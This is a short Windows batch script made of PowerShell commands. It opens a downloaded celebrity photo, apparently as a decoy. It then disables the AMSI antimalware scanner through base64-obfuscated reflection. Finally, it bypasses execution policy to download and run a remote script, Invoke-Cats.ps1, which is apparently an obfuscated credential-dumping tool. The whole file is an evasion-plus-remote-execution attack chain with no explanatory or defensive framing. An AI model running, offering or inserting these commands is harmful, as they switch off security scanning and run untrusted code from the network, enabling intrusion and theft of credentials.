cd %TEMP%

powershell.exe -command "invoke-webrequest -uri https://celebmafia.com/wp-content/uploads/2013/11/selena-gomez-on-red-carpet-flaunt-magazine-release-party_31.jpg -outfile selena.png"
selena.png


powershell.exe -command "[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)"

powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1')"
powershell read-host "everything right? :"